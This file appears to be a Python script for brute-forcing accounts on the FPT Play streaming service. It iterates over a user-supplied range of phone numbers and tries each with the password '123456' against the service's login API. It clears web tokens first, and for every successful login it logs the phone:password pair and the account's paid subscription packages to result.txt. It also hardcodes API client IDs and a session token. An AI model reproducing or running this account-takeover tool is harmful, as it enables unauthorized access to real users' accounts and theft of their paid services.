import requests
import json

class BearerAuth(requests.auth.AuthBase):
    def __init__(self, token):
        self.token = token
    def __call__(self, r):
        r.headers["authorization"] = "Bearer " + self.token
        return r

def login(phonenumber, password):
	s = requests.Session()
	payload = {
		'phone': phonenumber,
		'password': password,
		'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
	}
	res = s.post('https://api.fptplay.net/api/v6.2_w/user/otp/login?st=uZ0Fuqu3sJmFtpSFG7OFOA&e=1636173609921&device=Chrome(version:93)', json=payload)
	s.headers.update({'authorization': json.loads(res.content)})
	a = json.loads(res.content)
	if a['status'] == 1:
		get_goi_cuoc(a['data']['access_token'],phonenumber,password)


	return s

def logout():
	s = requests.Session()
	payloadd = {
		'e': 1636174885113,
		'push_reg_id': "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MzYxNzQ3Njk4NzgsImp0aSI6IjAwMWU0ZjcxLTAzMTctNDRjZi1hNjU2LThiZmY3YmJkY2JkMyIsInN1YiI6IjE5MTg4MjUifQ.ydVXMh8fZVVEo2ZB_-05yqq9kr1IUg9uxlYjF4_ZRBc",
		'st': "yeu2z6Oa71YrI_Q31loVig"
	}
	res = s.post('https://api.fptplay.net/api/v6.2_w/user/otp/logout?st=yeu2z6Oa71YrI_Q31loVig&e=1636174885113&device=Chrome(version:93)')
	a = json.loads(res.content)
	#print(res.content.decode('utf8'))


def cleartoken(phonenumber,password):
	s = requests.Session()
	payload = {
		'client_id': "vKyPNd1iWHodQVknxcvZoWz74295wnk8",
		'e': 1636175185333,
		'password': password,
		'phone': phonenumber,
		'st': "SPW0-E66xmJNFJZ0v9vV5w"
	}
	res = s.post('https://api.fptplay.net/api/v6.2_w/user/otp/clear_web_tokens?st=SPW0-E66xmJNFJZ0v9vV5w&e=1636175185333&device=Chrome(version:93)', json=payload)

	#print(res.raise_for_status())

	s.headers.update({'authorization': json.loads(res.content)})
	a = json.loads(res.content)
	#if a['status'] == 1:
		#print(res.content.decode('utf8'))
	#temp = login(phonenumber, password)

def get_goi_cuoc(token,phone,password):
	auth_token = token
	hed = {'Authorization': 'Bearer ' + auth_token}
	url = 'https://api.fptplay.net/api/v6.2_w/payment/get_user_vips?st=hAwKimycVNdjk27412BQKw&e=1636219247320&device=Chrome(version:93)'
	response = requests.get(url, headers=hed)
	a = response.json()["packages"]
	file = open("result.txt", "a+", encoding='utf-8')

	if len(a) > 0:
		print(phone, ":", password, " | ", end='')
		str1 = phone + " : " + password + " | "
		file.write(str1)
		for b in a:
			print(b["name"], ": ", b["dateleft"], "| ", end='')
			print()
			str2 = b["name"]
			str3 = b["dateleft"]
			str4 = str(str2), str(str3)
			file.write(str(str4))
		print()
		file.write("\n")








int_a = int(input("Nhap so bat dau :"))
int_b = int(input("Nhap so ket thuc :"))

for num in range(int_a , int_b):
	logout()
	cleartoken(str(num),'123456')
	login(str(num),'123456')

#logout()








